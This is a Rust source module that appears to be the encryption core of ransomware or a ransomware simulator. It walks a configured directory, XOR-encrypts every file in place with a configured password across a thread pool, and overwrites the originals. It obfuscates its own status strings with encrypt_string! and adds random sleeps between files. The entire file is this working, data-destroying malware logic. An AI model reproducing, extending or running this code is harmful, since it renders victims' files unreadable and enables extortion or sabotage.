use cryptify::encrypt_string;
use rayon::prelude::*;
use rayon::ThreadPoolBuilder;
use std::fs;
use std::io::{self, Read, Write};
use std::thread;
use std::time::Duration;
use walkdir::WalkDir;
use rand::Rng;

use crate::config;
use crate::crypto;

/// Main worker function that processes all files in the target directory
pub fn run() -> io::Result<()> {
    // Create thread pool with configured thread count
    let pool = ThreadPoolBuilder::new()
        .num_threads(config::THREAD_COUNT)
        .build()
        .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;

    if config::SHOW_CLI {
        println!("{}", encrypt_string!("Starting file processing..."));
        println!("{} {}", encrypt_string!("Target directory:"), config::TARGET_DIR);
        println!("{} {}", encrypt_string!("Thread count:"), config::THREAD_COUNT);
    }

    // Collect all file paths from target directory
    let files: Vec<_> = WalkDir::new(config::TARGET_DIR)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.file_type().is_file())
        .map(|e| e.path().to_path_buf())
        .collect();

    if config::SHOW_CLI {
        println!("{} {}", encrypt_string!("Found files:"), files.len());
    }

    // Process files in parallel using the thread pool
    pool.install(|| {
        files.par_iter().for_each(|file_path| {
            if let Err(e) = process_file(file_path) {
                if config::SHOW_CLI {
                    eprintln!("{} {:?}: {}", 
                        encrypt_string!("Error processing file"),
                        file_path,
                        e
                    );
                }
            }
        });
    });

    if config::SHOW_CLI {
        println!("{}", encrypt_string!("Processing complete!"));
    }

    Ok(())
}

/// Process a single file: read, encrypt, sleep, write back
fn process_file(file_path: &std::path::Path) -> io::Result<()> {
    // Read file contents
    let mut file = fs::File::open(file_path)?;
    let mut data = Vec::new();
    file.read_to_end(&mut data)?;
    
    let original_size = data.len();

    if config::SHOW_CLI {
        println!("{} {:?} ({} {})", 
            encrypt_string!("Processing"),
            file_path,
            original_size,
            encrypt_string!("bytes")
        );
    }

    // Encrypt the data
    crypto::xor_cipher(&mut data, config::PASSWORD.as_bytes());

    // Random sleep between 1-5 seconds
    let sleep_duration = rand::thread_rng().gen_range(1..=5);
    thread::sleep(Duration::from_secs(sleep_duration));

    if config::SHOW_CLI {
        println!("{} {:?} (slept {} {})", 
            encrypt_string!("Writing"),
            file_path,
            sleep_duration,
            encrypt_string!("seconds")
        );
    }

    // Write encrypted data back to file
    let mut file = fs::File::create(file_path)?;
    file.write_all(&data)?;

    if config::SHOW_CLI {
        println!("{} {:?}", 
            encrypt_string!("Completed"),
            file_path
        );
    }

    Ok(())
}
